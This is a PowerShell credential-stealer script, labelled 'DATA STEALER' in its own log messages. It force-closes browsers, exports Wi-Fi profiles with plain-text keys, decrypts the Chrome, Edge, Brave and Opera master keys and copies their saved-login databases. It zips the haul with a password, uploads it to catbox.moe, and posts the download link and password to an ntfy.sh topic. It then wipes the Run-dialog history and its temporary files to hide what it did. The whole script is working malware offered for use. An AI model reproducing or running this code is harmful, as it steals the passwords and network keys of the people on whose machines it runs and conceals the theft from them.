# ──────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────

$topic       = "data_stwealer_hideen_"               # your ntfy topic
$zipPassword = "fuckthesociety123!"                     # ← CHANGE THIS to something strong

$sevenZipPaths = @(
    "$env:ProgramFiles\7-Zip\7z.exe",
    "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
    "C:\7-Zip\7z.exe"                                # add custom path if needed
)

# ──────────────────────────────────────────────────────────────
# LOG FUNCTION ─ sends to console + ntfy
# ──────────────────────────────────────────────────────────────

function Write-Log {
    param([string]$msg)
    $timestamp = Get-Date -Format "HH:mm:ss"
    $line = "$timestamp | $msg"
    
    Write-Host $line
    
    # Send to ntfy (non-blocking, silent fail if rate-limited or offline)
    try {
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" `
                          -Method Post `
                          -Body $line `
                          -TimeoutSec 6 `
                          -ErrorAction SilentlyContinue
    } catch {}
}

# ──────────────────────────────────────────────────────────────
# START
# ──────────────────────────────────────────────────────────────

Write-Log "=== DATA STEALER STARTED (Visible + ntfy + Encrypted ZIP) ==="

# Load required .NET assemblies
try {
    Add-Type -AssemblyName System.Security
    Write-Log "System.Security assembly loaded"
} catch {
    Write-Log "CRITICAL: Failed to load System.Security - $($_.Exception.Message)"
}

# ──────────────────────────────────────────────────────────────
# Kill browsers to release file locks
# ──────────────────────────────────────────────────────────────

Write-Log "Terminating browsers..."
@("chrome","msedge","brave","opera") | ForEach-Object {
    Get-Process -Name $_ -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 4
Write-Log "Browsers terminated"

# ──────────────────────────────────────────────────────────────
# Prepare workspace
# ──────────────────────────────────────────────────────────────

$dir = "$env:TEMP\Cache_$(Get-Random -Minimum 100000 -Maximum 999999)"
$zip = "$env:TEMP\Pkg_$(Get-Random -Minimum 10000 -Maximum 999999).zip"

if (Test-Path $dir) { Remove-Item -Recurse -Force $dir -EA SilentlyContinue }
New-Item -ItemType Directory $dir | Out-Null
Write-Log "Workspace created: $dir"

# ──────────────────────────────────────────────────────────────
# Export Wi-Fi profiles
# ──────────────────────────────────────────────────────────────

Write-Log "Exporting Wi-Fi profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null
Write-Log "Wi-Fi export finished"

# ──────────────────────────────────────────────────────────────
# Steal browser credentials
# ──────────────────────────────────────────────────────────────

$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
}

foreach ($name in $browsers.Keys) {
    $basePath = $browsers[$name]
    $localStatePath = Join-Path $basePath "Local State"

    if (-not (Test-Path $localStatePath)) {
        Write-Log "[$name] Local State not found"
        continue
    }

    Write-Log "[$name] Processing..."

    try {
        $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        $masterKeyBytes = $encKey[5..($encKey.Length-1)]
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKeyBytes, $null, 'CurrentUser')
        $keyHex = [BitConverter]::ToString($masterKey) -replace '-'
        $keyHex | Out-File "$dir\$($name)_masterkey.txt" -Encoding ascii
        Write-Log "[$name] Master key extracted"

        $profileFolder = if ($name -eq "Opera") { $basePath } else { Join-Path $basePath "Default" }
        $loginDbPath = Join-Path $profileFolder "Login Data"

        if (Test-Path $loginDbPath) {
            Copy-Item $loginDbPath "$dir\$($name)_LoginData.db" -Force
            Write-Log "[$name] Login Data copied"
        } else {
            Write-Log "[$name] Login Data not found"
        }
    }
    catch {
        Write-Log "[$name] ERROR: $($_.Exception.Message)"
    }
}

# ──────────────────────────────────────────────────────────────
# Create PASSWORD-PROTECTED ZIP with 7-Zip
# ──────────────────────────────────────────────────────────────

Write-Log "Creating encrypted ZIP archive..."

$sevenZip = $null
foreach ($path in $sevenZipPaths) {
    if (Test-Path $path) {
        $sevenZip = $path
        break
    }
}

if ($sevenZip) {
    Write-Log "Using 7-Zip at: $sevenZip"
    & $sevenZip a -tzip -mx=5 "-p$zipPassword" "-mem=AES256" $zip "$dir\*" | Out-Null
    
    if (Test-Path $zip) {
        $sizeMB = "{0:N2}" -f ((Get-Item $zip).Length / 1MB)
        Write-Log "Encrypted ZIP created: $zip ($sizeMB MB)"
        Write-Log "ZIP Password: $zipPassword"
    } else {
        Write-Log "ERROR: 7-Zip failed to create archive"
    }
} else {
    Write-Log "ERROR: 7z.exe not found in any searched location → skipping encryption"
}

# ──────────────────────────────────────────────────────────────
# Upload to catbox.moe
# ──────────────────────────────────────────────────────────────

if (Test-Path $zip) {
    Write-Log "Uploading to catbox.moe..."
    $uploadResult = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

    if ($uploadResult -match '^https?://files\.catbox\.moe/') {
        Write-Log "Upload successful → $uploadResult"
        $message = "Upload ready: $uploadResult`nPassword: $zipPassword"
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body $message -EA SilentlyContinue
    } else {
        Write-Log "Upload failed or invalid response: $uploadResult"
    }
} else {
    Write-Log "No ZIP file to upload"
}

# ──────────────────────────────────────────────────────────────
# Cleanup
# ──────────────────────────────────────────────────────────────

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -EA SilentlyContinue
Remove-Item -Recurse -Force $dir, $zip -EA SilentlyContinue
Write-Log "Cleanup completed"

# ──────────────────────────────────────────────────────────────
# FINISH
# ──────────────────────────────────────────────────────────────

Write-Log "=== OPERATION FINISHED ==="

# Give time to read output before closing window
Start-Sleep -Seconds 0.5
exit
